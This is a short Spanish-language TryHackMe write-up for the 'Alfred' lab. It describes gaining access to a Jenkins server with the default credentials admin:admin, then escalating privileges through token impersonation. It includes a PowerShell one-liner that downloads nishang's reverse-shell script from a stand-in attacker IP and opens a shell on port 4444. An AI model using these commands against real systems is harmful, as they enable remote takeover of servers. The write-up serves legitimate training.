---
title: "Alfred"
platform: TryHackMe
difficulty: Medium
date: 2024-02-10
tags: [windows, web, rev]
---

## Descripción

Máquina Windows con Jenkins expuesto. Objetivo: RCE mediante build malicioso y escalada de privilegios via token impersonation.

## Reconocimiento

```bash
nmap -sC -sV 10.10.x.x
```

Puerto **8080** abierto con Jenkins accesible.

## Acceso inicial

Las credenciales por defecto `admin:admin` funcionan en el panel de Jenkins.

Creamos un nuevo proyecto con un **Build Step** de Windows Batch Command para obtener reverse shell con `nishang`:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://TU_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress TU_IP -Port 4444
```

## Escalada de privilegios

Verificamos los privilegios del token actual:

```
whoami /priv
```

`SeImpersonatePrivilege` habilitado → usamos **PrintSpoofer** o **JuicyPotato** para escalar a SYSTEM.

## Lecciones aprendidas

- Credenciales por defecto son críticas.
- Token Impersonation es un vector clásico en Windows.
